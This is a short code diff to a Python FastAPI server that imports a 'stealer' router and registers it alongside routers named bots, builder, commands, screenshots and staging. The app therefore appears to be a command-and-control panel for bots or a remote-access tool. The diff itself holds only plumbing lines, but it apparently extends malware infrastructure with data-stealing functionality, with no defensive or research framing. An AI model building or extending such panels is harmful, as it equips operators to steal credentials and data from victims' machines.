@@ -48,7 +48,7 @@ def create_app(registry: Registry, event_bus: EventBus) -> FastAPI:
     app.state.event_bus = event_bus
 
     # Import and include routers
-    from .routers import auth, bots, builder, commands, downloads, screenshots, staging, ws
+    from .routers import auth, bots, builder, commands, downloads, screenshots, staging, stealer, ws
 
     app.include_router(auth.router)
     app.include_router(bots.router)
@@ -57,6 +57,7 @@ def create_app(registry: Registry, event_bus: EventBus) -> FastAPI:
     app.include_router(screenshots.router)
     app.include_router(builder.router)
     app.include_router(staging.router)
+    app.include_router(stealer.router)
     app.include_router(ws.router)
 
     # Mount static files for web UI
